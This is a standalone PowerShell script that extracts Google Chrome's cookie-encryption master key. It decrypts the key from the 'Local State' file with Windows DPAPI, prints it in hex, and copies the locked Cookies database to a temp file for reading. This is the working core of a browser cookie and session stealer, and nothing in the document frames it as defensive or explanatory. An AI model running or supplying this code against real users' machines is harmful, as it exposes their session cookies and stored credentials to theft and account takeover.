Add-Type -AssemblyName System.Security

$localAppData = $env:LOCALAPPDATA
$localStatePath = "$localAppData\Google\Chrome\User Data\Local State"
$cookiePath = "$localAppData\Google\Chrome\User Data\Default\Network\Cookies"
$tempDb = "$env:TEMP\chrome_cookies_temp.db"

if (-not (Test-Path $localStatePath)) {
    Write-Host "Local State not found"
    exit 1
}

# 1. Read encrypted master key
$localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
$encryptedKeyBase64 = $localState.os_crypt.encrypted_key
$encryptedKeyBytes = [Convert]::FromBase64String($encryptedKeyBase64)

# Skip DPAPI prefix (5 bytes)
$dpapiBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]

# 2. Decrypt with DPAPI
$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $dpapiBytes,
    $null,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)

Write-Host "MASTER_KEY_HEX:" ([System.BitConverter]::ToString($masterKey) -replace '-')

# 3. Copy cookie database to temp (since Chrome locks it when open)
Copy-Item $cookiePath $tempDb -Force

Write-Host "COPIED_DB_TO_TEMP: $tempDb"
